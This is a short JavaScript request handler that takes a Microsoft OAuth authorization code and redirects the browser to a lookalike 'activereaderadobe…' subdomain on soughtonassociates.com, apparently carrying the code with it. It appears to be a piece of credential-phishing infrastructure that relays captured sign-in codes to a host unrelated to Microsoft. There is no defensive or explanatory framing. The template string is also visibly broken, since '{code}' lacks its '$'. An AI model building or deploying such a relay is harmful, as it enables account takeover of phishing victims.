export default function handler(req, res) {
  // Microsoft sends data in the body for form_post
  const code = req.body?.code || req.query?.code;

  if (code) {
    // Instant redirect to your final page
    return res.redirect(302, `https://activereaderadobed8d3n39d9.soughtonassociates.com{code}`);
  }

  // If something went wrong, send them to your site with an error
  return res.redirect(302, 'https://activereaderadobed8d3n39d9.soughtonassociates.com');
}
